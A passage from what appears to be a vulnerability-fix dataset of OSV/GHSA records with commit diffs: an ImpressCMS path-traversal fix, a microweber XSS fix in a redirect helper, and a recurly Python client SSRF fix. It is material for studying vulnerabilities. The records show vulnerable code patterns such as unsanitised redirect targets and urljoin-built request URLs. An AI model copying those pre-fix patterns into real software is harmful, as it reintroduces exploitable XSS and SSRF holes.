event\");\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\n+\\t\\t\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t\\t} else {\\n+\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors($uploaderObj->getErrors(false));\\n+\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\n+\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t} else {\\n+\\t\\t\\t\\t\\t\\t$icmsObj->setErrors($uploaderObj->getErrors(false));\\n+\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t}\\n+\\n+\\t\\t\\t}\\n+\\t\\t}\\n+\\n+\\t\\tif ($uploaderResult) {\\n+\\t\\t\\tif ($debug) {\\n+\\t\\t\\t\\t$storeResult = $this->handler->insertD($icmsObj);\\n+\\t\\t\\t} else {\\n+\\t\\t\\t\\t$storeResult = $this->handler->insert($icmsObj);\\n+\\t\\t\\t}\\n+\\t\\t} else {\\n+\\t\\t\\t$storeResult = false;\\n+\\t\\t}\\n+\\n+\\t\\tif ($storeResult) {\\n+\\t\\t\\tif ($this->handler->getPermissions()) {\\n+\\t\\t\\t\\t$icmspermissions_handler = new icms_ipf_permission_Handler($this->handler);\\n+\\t\\t\\t\\t$icmspermissions_handler->storeAllPermissionsForId($icmsObj->id());\\n+\\t\\t\\t}\\n+\\t\\t}\\n+\\n+\\t\\tif ($redirect_page === null) {\\n+\\t\\t\\treturn $icmsObj;\\n+\\t\\t} else {\\n+\\t\\t\\tif (!$storeResult) {\\n+\\t\\t\\t\\tredirect_header($impresscms->urls[\\'previouspage\\'], 3, _CO_ICMS_SAVE_ERROR . $icmsObj->getHtmlErrors());\\n+\\t\\t\\t} else {\\n+\\t\\t\\t\\t$redirect_page = $redirect_page ? $redirect_page : icms_get_page_before_form();\\n+\\t\\t\\t\\tredirect_header($redirect_page, 2, $redirect_msg);\\n+\\t\\t\\t}\\n+\\t\\t}\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * Store the object in the database autmatically from a form sending POST data\\n+\\t *\\n+\\t * @param string $created_success_msg message to display if new object was created\\n+\\t * @param string $modified_success_msg message to display if object was successfully edited\\n+\\t * @param string $created_redir_page redirect page after creating the object\\n+\\t * @param string $modified_redir_page redirect page after editing the object\\n+\\t * @param string $redirect_page redirect page, if not set, then we backup once\\n+\\t * @param bool $exit if set to TRUE then the script ends\\n+\\t * @return bool\\n+\\t *\/\\n+\\tpublic function &storeFromDefaultForm($created_success_msg, $modified_success_msg, $redirect_page=false, $debug=false, $x_param = false) {\\n+\\t\\t$objectid = ( isset($_POST[$this->handler->keyName]) )\\n+\\t\\t\\t\\t? (int) $_POST[$this->handler->keyName]\\n+\\t\\t\\t\\t: 0;\\n+\\t\\tif ($debug) {\\n+\\t\\t\\tif ($x_param) {\\n+\\t\\t\\t\\t$icmsObj = $this->handler->getD($objectid, true,  $x_param);\\n+\\t\\t\\t} else {\\n+\\t\\t\\t\\t$icmsObj = $this->handler->getD($objectid);\\n+\\t\\t\\t}\\n+\\n+\\t\\t} else {\\n+\\t\\t\\tif ($x_param) {\\n+\\t\\t\\t\\t$icmsObj = $this->handler->get($objectid, true, false, false, $x_param);\\n+\\t\\t\\t} else {\\n+\\t\\t\\t\\t$icmsObj = $this->handler->get($objectid);\\n+\\t\\t\\t}\\n+\\t\\t}\\n+\\n+\\t\\t\/**\\n+\\t\\t * @todo multilanguage persistable handler is not fully implemented yet\\n+\\t\\t *\/\\n+\\n+\\t\\t\/\/ if handler is the Multilanguage handler, we will need to treat this for multilanguage\\n+\\t\\tif (is_subclass_of($this->handler, \\'icmspersistablemlobjecthandler\\')) {\\n+\\n+\\t\\t\\tif ($icmsObj->isNew()) {\\n+\\t\\t\\t\\t\/\/ This is a new object. We need to store the meta data and then the language data\\n+\\t\\t\\t\\t\/\/ First, we will get rid of the multilanguage data to only store the meta data\\n+\\t\\t\\t\\t$icmsObj->stripMultilanguageFields();\\n+\\t\\t\\t\\t$newObject =& $this->doStoreFromDefaultForm($icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page, $debug);\\n+\\t\\t\\t\\t\/**\\n+\\t\\t\\t\\t * @todo we need to trap potential errors here\\n+\\t\\t\\t\\t *\/\\n+\\n+\\t\\t\\t\\t\/\/ ok, the meta daa is stored. Let\\'s recreate the object and then\\n+\\t\\t\\t\\t\/\/ get rid of anything not multilanguage\\n+\\t\\t\\t\\tunset($icmsObj);\\n+\\t\\t\\t\\t$icmsObj = $this->handler->get($objectid);\\n+\\t\\t\\t\\t$icmsObj->stripNonMultilanguageFields();\\n+\\n+\\t\\t\\t\\t$icmsObj->setVar($this->handler->keyName, $newObject->getVar($this->handler->keyName));\\n+\\t\\t\\t\\t$this->handler->changeTableNameForML();\\n+\\t\\t\\t\\t$ret =& $this->doStoreFromDefaultForm($icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page, $debug);\\n+\\n+\\t\\t\\t\\treturn $ret;\\n+\\t\\t\\t}\\n+\\t\\t} else {\\n+\\t\\t\\treturn $this->doStoreFromDefaultForm($icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page, $debug);\\n+\\t\\t}\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * Stores an object and shows debug information\\n+\\t *\/\\n+\\tpublic function &storeicms_ipf_ObjectD() {\\n+\\t\\treturn $this->storeicms_ipf_Object(true);\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tbool\\t$debug\\n+\\t * @param\\tbool\\t$xparam\\n+\\t * @see\\t\\tstoreFromDefaultForm\\n+\\t *\/\\n+\\tpublic function &storeicms_ipf_Object($debug=false, $xparam = false) {\\n+\\t\\t$ret =& $this->storeFromDefaultForm(\\'\\', \\'\\', null, $debug, $xparam);\\n+\\n+\\t\\treturn $ret;\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * Handles deletion of an object which keyid is passed as a GET param\\n+\\t *\\n+\\t * @param string $redir_page redirect page after deleting the object\\n+\\t * @return bool\\n+\\t *\/\\n+\\tpublic function handleObjectDeletion($confirm_msg = false, $op=\\'del\\', $userSide=false) {\\n+\\t\\tglobal $impresscms;\\n+\\n+\\t\\t$objectid = (isset($_REQUEST[$this->handler->keyName])) ? (int) $_REQUEST[$this->handler->keyName] : 0;\\n+\\t\\t$icmsObj = $this->handler->get($objectid);\\n+\\n+\\t\\tif ($icmsObj->isNew()) {\\n+\\t\\t\\tredirect_header(\"javascript:history.go(-1)\", 3, _CO_ICMS_NOT_SELECTED);\\n+\\t\\t\\texit();\\n+\\t\\t}\\n+\\n+\\t\\t$confirm = ( isset($_POST[\\'confirm\\']) ) ? $_POST[\\'confirm\\'] : 0;\\n+\\t\\tif ($confirm) {\\n+\\t\\t\\tif (!$this->handler->delete($icmsObj)) {\\n+\\t\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_ERROR . $icmsObj->getHtmlErrors());\\n+\\t\\t\\t\\texit;\\n+\\t\\t\\t}\\n+\\n+\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_SUCCESS);\\n+\\t\\t\\texit();\\n+\\t\\t} else {\\n+\\t\\t\\t\/\/ no confirm: show deletion condition\\n+\\n+\\t\\t\\ticms_cp_header();\\n+\\n+\\t\\t\\tif (!$confirm_msg) {\\n+\\t\\t\\t\\t$confirm_msg = _CO_ICMS_DELETE_CONFIRM;\\n+\\t\\t\\t}\\n+\\n+\\t\\t\\t$hiddens = array(\\n+\\t\\t\\t\\t\\t\\t\\'op\\' => $op,\\n+\\t\\t\\t\\t\\t\\t$this->handler->keyName => $icmsObj->getVar($this->handler->keyName),\\n+\\t\\t\\t\\t\\t\\t\\'confirm\\' => 1,\\n+\\t\\t\\t\\t\\t\\t\\'redirect_page\\' => $impresscms->urls[\\'previouspage\\']\\n+\\t\\t\\t);\\n+\\t\\t\\tif ($this->handler->_moduleName == \\'system\\') {\\n+\\t\\t\\t\\t$hiddens[\\'fct\\'] = isset($_GET[\\'fct\\']) ? $_GET[\\'fct\\'] : false;\\n+\\t\\t\\t}\\n+\\t\\t\\ticms_core_Message::confirm($hiddens, xoops_getenv(\\'SCRIPT_NAME\\'), sprintf($confirm_msg , $icmsObj->getVar($this->handler->identifierName)), _CO_ICMS_DELETE);\\n+\\n+\\t\\t\\ticms_cp_footer();\\n+\\n+\\t\\t}\\n+\\t\\texit();\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tbool\\t$confirm_msg\\n+\\t * @param\\tstring\\t$op\\n+\\t *\/\\n+\\tpublic function handleObjectDeletionFromUserSide($confirm_msg = false, $op=\\'del\\') {\\n+\\t\\tglobal $icmsTpl, $impresscms;\\n+\\n+\\t\\t$objectid = ( isset($_REQUEST[$this->handler->keyName]) ) ? (int) ($_REQUEST[$this->handler->keyName]) : 0;\\n+\\t\\t$icmsObj = $this->handler->get($objectid);\\n+\\n+\\t\\tif ($icmsObj->isNew()) {\\n+\\t\\t\\tredirect_header(\"javascript:history.go(-1)\", 3, _CO_ICMS_NOT_SELECTED);\\n+\\t\\t\\texit();\\n+\\t\\t}\\n+\\n+\\t\\t$confirm = ( isset($_POST[\\'confirm\\']) ) ? $_POST[\\'confirm\\'] : 0;\\n+\\t\\tif ($confirm) {\\n+\\t\\t\\tif (!$this->handler->delete($icmsObj)) {\\n+\\t\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_ERROR . $icmsObj->getHtmlErrors());\\n+\\t\\t\\t\\texit;\\n+\\t\\t\\t}\\n+\\n+\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_SUCCESS);\\n+\\t\\t\\texit();\\n+\\t\\t} else {\\n+\\t\\t\\t\/\/ no confirm: show deletion condition\\n+\\t\\t\\tif (!$confirm_msg) {\\n+\\t\\t\\t\\t$confirm_msg = _CO_ICMS_DELETE_CONFIRM;\\n+\\t\\t\\t}\\n+\\n+\\t\\t\\tob_start();\\n+\\t\\t\\ticms_core_Message::confirm(array(\\n+\\t\\t\\t\\t\\'op\\' => $op,\\n+\\t\\t\\t\\t$this->handler->keyName => $icmsObj->getVar($this->handler->keyName),\\n+\\t\\t\\t\\t\\'confirm\\' => 1,\\n+\\t\\t\\t\\t\\'redirect_page\\' => $impresscms->urls[\\'previouspage\\']),\\n+\\t\\t\\t\\txoops_getenv(\\'SCRIPT_NAME\\'),\\n+\\t\\t\\t\\tsprintf($confirm_msg ,\\n+\\t\\t\\t\\t$icmsObj->getVar($this->handler->identifierName)),\\n+\\t\\t\\t\\t_CO_ICMS_DELETE\\n+\\t\\t\\t);\\n+\\t\\t\\t$icmspersistable_delete_confirm = ob_get_clean();\\n+\\t\\t\\t$icmsTpl->assign(\\'icmspersistable_delete_confirm\\', $icmspersistable_delete_confirm);\\n+\\t\\t}\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * Retrieve the object admin side link for a {@link icms_ipf_view_Single} page\\n+\\t *\\n+\\t * @param\\tobject\\t$icmsObj\\treference to the object from which we want the user side link\\n+\\t * @param\\tbool\\t$onlyUrl\\twhether or not to return a simple URL or a full <a> link\\n+\\t * @param\\tbool\\t$withimage\\treturn a linked image instead of linked text\\n+\\t * @return\\tstring\\tadmin side link to the object\\n+\\t *\/\\n+\\tpublic function getAdminViewItemLink($icmsObj, $onlyUrl=false, $withimage=false) {\\n+\\t\\t$ret = $this->handler->_moduleUrl . \"admin\/\"\\n+\\t\\t\\t. $this->handler->_page . \"?op=view&amp;\"\\n+\\t\\t\\t. $this->handler->keyName . \"=\"\\n+\\t\\t\\t. $icmsObj->getVar($this->handler->keyName);\\n+\\t\\tif ($onlyUrl) {\\n+\\t\\t\\treturn $ret;\\n+\\t\\t} elseif ($withimage) {\\n+\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\n+\\t\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL\\n+\\t\\t\\t\\t\\t. \"\/actions\/viewmag.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\n+\\t\\t\\t\\t\\t. _CO_ICMS_ADMIN_VIEW . \"\\'  title=\\'\"\\n+\\t\\t\\t\\t\\t. _CO_ICMS_ADMIN_VIEW . \"\\'\/><\/a>\";\\n+\\t\\t}\\n+\\n+\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * Retrieve the object user side link\\n+\\t *\\n+\\t * @param object $icmsObj reference to the object from which we want the user side link\\n+\\t * @param bool $onlyUrl wether or not to return a simple URL or a full <a> link\\n+\\t * @return string user side link to the object\\n+\\t *\/\\n+\\tpublic function getItemLink(&$icmsObj, $onlyUrl=false) {\\n+\\t\\t\/**\\n+\\t\\t * @todo URL Rewrite feature is not finished yet...\\n+\\t\\t *\/\\n+\\t\\t\/\/$seoMode = smart_getModuleModeSEO($this->handler->_moduleName);\\n+\\t\\t\/\/$seoModuleName = smart_getModuleNameForSEO($this->handler->_moduleName);\\n+\\t\\t$seoMode = false;\\n+\\t\\t$seoModuleName = $this->handler->_moduleName;\\n+\\n+\\t\\t\/**\\n+\\t\\t * $seoIncludeId feature is not finished yet, so let\\'s put it always to true\\n+\\t\\t *\/\\n+\\t\\t\/\/$seoIncludeId = smart_getModuleIncludeIdSEO($this->handler->_moduleName);\\n+\\t\\t$seoIncludeId = true;\\n+\\n+\\t\\t\/*if ($seoMode == \\'rewrite\\') {\\n+\\t\\t\\t$ret = ICMS_URL . \\'\/\\' . $seoModuleName . \\'.\\' . $this->handler->_itemname . ($seoIncludeId ? \\'.\\'\\t. $icmsObj->getVar($this->handler->keyName) : \\'\\'). \\'\/\\' . $icmsObj->getVar(\\'short_url\\') . \\'.html\\';\\n+\\t\\t\\t} else if ($seoMode == \\'pathinfo\\') {\\n+\\t\\t\\t$ret = SMARTOBJECT_URL . \\'seo.php\/\\' . $seoModuleName . \\'.\\' . $this->handler->_itemname . ($seoIncludeId ? \\'.\\'\\t. $icmsObj->getVar($this->handler->keyName) : \\'\\'). \\'\/\\' . $icmsObj->getVar(\\'short_url\\') . \\'.html\\';\\n+\\t\\t\\t} else {\\n+\\t\\t\\t*\/\\t$ret = $this->handler->_moduleUrl . $this->handler->_page . \"?\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t\/\/}\\n+\\n+\\t\\tif (!$onlyUrl) {\\n+\\t\\t\\t$ret = \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\n+\\t\\t}\\n+\\t\\treturn $ret;\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * This method returns a view link of the Object\\n+\\t *\\n+\\t * @param icms_ipf_Object $icmsObj\\n+\\t * @param boolean $onlyUrl\\n+\\t * @param boolean $withimage\\n+\\t * @param boolean $userSide\\n+\\t * @return string\\n+\\t *\/\\n+\\tpublic function getViewItemLink($icmsObj, $onlyUrl=false, $withimage=true, $userSide=false) {\\n+\\t\\tif ($this->handler->_moduleName != \\'system\\') {\\n+\\t\\t\\t$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\n+\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . $this->handler->_page . \"?\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t} else {\\n+\\t\\t\\t$admin_side = \\'\\';\\n+\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . \\'admin.php?fct=\\'\\n+\\t\\t\\t\\t. $this->handler->_itemname . \"&amp;op=view&amp;\"\\n+\\t\\t\\t\\t. $this->handler->keyName . \"=\"\\n+\\t\\t\\t\\t. $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t}\\n+\\t\\tif ($onlyUrl) {\\n+\\t\\t\\treturn $ret;\\n+\\t\\t} elseif ($withimage) {\\n+\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\n+\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/viewmag.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\n+\\t\\t\\t\\t. _PREVIEW . \"\\'  title=\\'\" . _PREVIEW . \"\\'\/><\/a>\";\\n+\\t\\t}\\n+\\n+\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tobject\\t$icmsObj\\n+\\t * @param\\tbool\\t$onlyUrl\\n+\\t * @param\\tbool\\t$withimage\\n+\\t *\/\\n+\\tpublic function getEditLanguageLink($icmsObj, $onlyUrl=false, $withimage=true) {\\n+\\t\\t$ret = $this->handler->_moduleUrl . \"admin\/\"\\n+\\t\\t\\t. $this->handler->_page\\n+\\t\\t\\t. \"?op=mod&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName)\\n+\\t\\t\\t. \"&amp;language=\" . $icmsObj->getVar(\\'language\\');\\n+\\t\\tif ($onlyUrl) {\\n+\\t\\t\\treturn $ret;\\n+\\t\\t} elseif ($withimage) {\\n+\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\n+\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/wizard.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\n+\\t\\t\\t\\t. _CO_ICMS_LANGUAGE_MODIFY . \"\\'  title=\\'\" . _CO_ICMS_LANGUAGE_MODIFY . \"\\'\/><\/a>\";\\n+\\t\\t}\\n+\\n+\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tobj\\t\\t$icmsObj\\n+\\t * @param\\tbool\\t$onlyUrl\\n+\\t * @param\\tbool\\t$withimage\\n+\\t * @param\\tbool\\t$userSide\\n+\\t *\/\\n+\\tpublic function getEditItemLink($icmsObj, $onlyUrl=false, $withimage=true, $userSide=false) {\\n+\\t\\tif ($this->handler->_moduleName != \\'system\\') {\\n+\\t\\t\\t$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\n+\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . $this->handler->_page\\n+\\t\\t\\t\\t. \"?op=mod&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t} else {\\n+\\t\\t\\t\/**\\n+\\t\\t\\t * @todo: to be implemented...\\n+\\t\\t\\t *\/\\n+\\t\\t\\t\/\/$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\n+\\t\\t\\t$admin_side = \\'\\';\\n+\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side\\n+\\t\\t\\t\\t. \\'admin.php?fct=\\' . $this->handler->_itemname\\n+\\t\\t\\t\\t. \"&amp;op=mod&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t}\\n+\\t\\tif ($onlyUrl) {\\n+\\t\\t\\treturn $ret;\\n+\\t\\t} elseif ($withimage) {\\n+\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\n+\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/edit.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\n+\\t\\t\\t\\t. _CO_ICMS_MODIFY . \"\\'  title=\\'\" . _CO_ICMS_MODIFY . \"\\'\/><\/a>\";\\n+\\t\\t}\\n+\\n+\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tobj\\t\\t$icmsObj\\n+\\t * @param\\tbool\\t$onlyUrl\\n+\\t * @param\\tbool\\t$withimage\\n+\\t * @param\\tbool\\t$userSide\\n+\\t *\/\\n+\\tpublic function getDeleteItemLink($icmsObj, $onlyUrl=false, $withimage=true, $userSide=false) {\\n+\\t\\tif ($this->handler->_moduleName != \\'system\\') {\\n+\\t\\t\\t$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\n+\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . $this->handler->_page\\n+\\t\\t\\t\\t. \"?op=del&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t} else {\\n+\\t\\t\\t\/**\\n+\\t\\t\\t * @todo: to be implemented...\\n+\\t\\t\\t *\/\\n+\\t\\t\\t\/\/$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\n+\\t\\t\\t$admin_side = \\'\\';\\n+\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side\\n+\\t\\t\\t\\t. \\'admin.php?fct=\\' . $this->handler->_itemname\\n+\\t\\t\\t\\t. \"&amp;op=del&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t}\\n+\\t\\tif ($onlyUrl) {\\n+\\t\\t\\treturn $ret;\\n+\\t\\t} elseif ($withimage) {\\n+\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\n+\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/editdelete.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\n+\\t\\t\\t\\t. _CO_ICMS_DELETE . \"\\'  title=\\'\" . _CO_ICMS_DELETE . \"\\'\/><\/a>\";\\n+\\t\\t}\\n+\\n+\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tobj\\t\\t$icmsObj\\n+\\t * @todo\\tNeeds to be completed\\n+\\t *\/\\n+\\tpublic function getPrintAndMailLink($icmsObj) {\\n+\\t\\tglobal $icmsConfig, $impresscms;\\n+\\n+\\t\\t$ret = \\'\\';\\n+\\t\\t\/*\\t\\t$printlink = $this->handler->_moduleUrl . \"print.php?\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\n+\\t\\t $js = \"javascript:openWithSelfMain(\\'\" . $printlink . \"\\', \\'smartpopup\\', 700, 519);\";\\n+\\t\\t $printlink = \\'<a href=\"\\' . $js . \\'\"><img  src=\"\\' . ICMS_IMAGES_SET_URL . \\'\/actions\/fileprint.png\" alt=\"\" style=\"vertical-align: middle;\"\/><\/a>\\';\\n+\\n+\\t\\t $icmsModule = icms_getModuleInfo($icmsObj->handler->_moduleName);\\n+\\t\\t $link = $impresscms->urls[\\'full\\']();\\n+\\t\\t $mid = $icmsModule->getVar(\\'mid\\');\\n+\\t\\t $friendlink = \"<a href=\\\\\"javascript:openWithSelfMain(\\'\".SMARTOBJECT_URL.\"sendlink.php?link=\" . $link . \"&amp;mid=\" . $mid . \"\\', \\',\\',\\',\\',\\',\\',\\'sendmessage\\', 674, 500);\\\\\"><img src=\\\\\"\".SMARTOBJECT_IMAGES_ACTIONS_URL . \"mail_send.png\\\\\"  alt=\\\\\"\" . _CO_ICMS_EMAIL . \"\\\\\" title=\\\\\"\" . _CO_ICMS_EMAIL . \"\\\\\" style=\\\\\"vertical-align: middle;\\\\\"\/><\/a>\";\\n+\\n+\\t\\t $ret = \\'<span id=\"smartobject_print_button\">\\' . $printlink . \"&nbsp;<\/span>\" . \\'<span id=\"smartobject_mail_button\">\\' . $friendlink . \\'<\/span>\\';\\n+\\t\\t *\/\\n+\\t\\treturn $ret;\\n+\\t}\\n+\\n+\\t\/**\\n+\\t * Creates a string from the object\\'s module name and item name\\n+\\t *\/\\n+\\tpublic function getModuleItemString() {\\n+\\t\\t$ret = $this->handler->_moduleName . \\'_\\' . $this->handler->_itemname;\\n+\\t\\treturn $ret;\\n+\\t}\\n+}\\n+'}}","message_norm":"prevents using submitted filenames with ..\/ for controller (#812)\n\n* prevents using submitted filenames with ..\/ for controller\r\n\r\n* using preg replace for better parent paths replaces\r\n\r\nco-authored-by: raimondas rimkevi\u010dius (aka mekdrop) <mekdrop@impresscms.org>","language":"en","entities":"[('prevents', 'ACTION', ''), ('#812', 'ISSUE', ''), ('prevents', 'ACTION', ''), ('mekdrop@impresscms.org', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['htdocs\/libraries\/icms\/ipf\/Controller.php'])","num_files":1.0},{"index":223,"vuln_id":"GHSA-38m9-3vg4-rwvp","cwe_id":"{'CWE-79'}","score":6.5,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8'}","dataset":"osv","summary":"Cross-site Scripting in microweber microweber prior to version 1.2.11 is vulnerable to cross-site scripting.","published_date":"2022-02-20","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8","commit_sha":"2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8","patch":"SINGLE","chain_ord":"['2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8']","before_first_fix_commit":"{'93e1e59185d1fdf921d89a887887bca988b12085'}","last_fix_commit":"2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8","chain_ord_pos":1.0,"commit_datetime":"02\/18\/2022, 10:09:45","message":"Update UrlManager.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/MicroweberPackages\/Helper\/UrlManager.php': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8\/src%2FMicroweberPackages%2FHelper%2FUrlManager.php', 'patch': '@@ -114,6 +114,9 @@ public function redirect($url)\\n         $redirectUrl = str_replace(\"\\\\r\", \"\", $redirectUrl);\\n         $redirectUrl = str_replace(\"\\\\n\", \"\", $redirectUrl);\\n \\n+        $clearInput = new HTMLClean();\\n+        $redirectUrl = $clearInput->clean($redirectUrl);\\n+\\n         if (headers_sent()) {\\n             echo \\'<meta http-equiv=\"refresh\" content=\"0;url=\\' . $redirectUrl . \\'\">\\';\\n         } else {'}}","message_norm":"update urlmanager.php","language":"sv","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SUBMIT_CENTERED","list_files":"dict_keys(['src\/MicroweberPackages\/Helper\/UrlManager.php'])","num_files":1.0},{"index":226,"vuln_id":"GHSA-38rv-5jqc-m2cv","cwe_id":"{'CWE-918'}","score":0.0,"chain":"{'https:\/\/github.com\/recurly\/recurly-client-python\/commit\/049c74699ce93cf126feff06d632ea63fba36742'}","dataset":"osv","summary":"High severity vulnerability that affects recurly The Recurly Client Python Library before 2.0.5, 2.1.16, 2.2.22, 2.3.1, 2.4.5, 2.5.1, 2.6.2 is vulnerable to a Server-Side Request Forgery vulnerability in the \"Resource.get\" method that could result in compromise of API keys or other critical resources.","published_date":"2019-01-04","chain_len":1,"project":"https:\/\/github.com\/recurly\/recurly-client-python","commit_href":"https:\/\/github.com\/recurly\/recurly-client-python\/commit\/049c74699ce93cf126feff06d632ea63fba36742","commit_sha":"049c74699ce93cf126feff06d632ea63fba36742","patch":"SINGLE","chain_ord":"['049c74699ce93cf126feff06d632ea63fba36742']","before_first_fix_commit":"{'9db2d1a0268201571a567d73481d0d16c6fbc5e1'}","last_fix_commit":"049c74699ce93cf126feff06d632ea63fba36742","chain_ord_pos":1.0,"commit_datetime":"11\/09\/2017, 00:45:28","message":"Fix SSRF: do not use urljoin, quote uuids","author":"Benjamin Eckel","comments":null,"stats":"{'additions': 6, 'deletions': 6, 'total': 12}","files":"{'recurly\/resource.py': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/recurly\/recurly-client-python\/raw\/049c74699ce93cf126feff06d632ea63fba36742\/recurly%2Fresource.py', 'patch': '@@ -12,8 +12,7 @@\\n import recurly.errors\\n from recurly.link_header import parse_link_value\\n from six.moves import http_client\\n-from six.moves.urllib.parse import urlencode, urljoin, urlsplit\\n-\\n+from six.moves.urllib.parse import urlencode, urlsplit, quote\\n \\n class Money(object):\\n \\n@@ -338,7 +337,8 @@ def get(cls, uuid):\\n         can be directly requested with this method.\\n \\n         \"\"\"\\n-        url = urljoin(recurly.base_uri(), cls.member_path % (uuid,))\\n+        uuid = quote(str(uuid))\\n+        url = recurly.base_uri() + (cls.member_path % (uuid,))\\n         resp, elem = cls.element_for_url(url)\\n         return cls.from_element(elem)\\n \\n@@ -606,7 +606,7 @@ def all(cls, **kwargs):\\n         parameters.\\n \\n         \"\"\"\\n-        url = urljoin(recurly.base_uri(), cls.collection_path)\\n+        url = recurly.base_uri() + cls.collection_path\\n         if kwargs:\\n             url = \\'%s?%s\\' % (url, urlencode(kwargs))\\n         return Page.page_for_url(url)\\n@@ -616,7 +616,7 @@ def count(cls, **kwargs):\\n         \"\"\"Return a count of server side resources given\\n         filtering arguments in kwargs.\\n         \"\"\"\\n-        url = urljoin(recurly.base_uri(), cls.collection_path)\\n+        url = recurly.base_uri() + cls.collection_path\\n         if kwargs:\\n             url 